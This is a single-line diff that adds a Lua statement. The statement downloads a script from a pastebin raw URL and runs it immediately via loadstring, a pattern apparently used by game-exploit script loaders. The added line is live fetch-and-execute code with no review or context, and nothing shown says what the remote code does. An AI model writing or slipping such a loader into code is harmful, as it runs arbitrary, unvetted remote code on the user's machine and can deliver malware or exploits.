@@ -1,0 +1,1 @@
+loadstring(Raindrop:DownloadString('https://pastebin.com/raw/ZFSTSi9T'))()
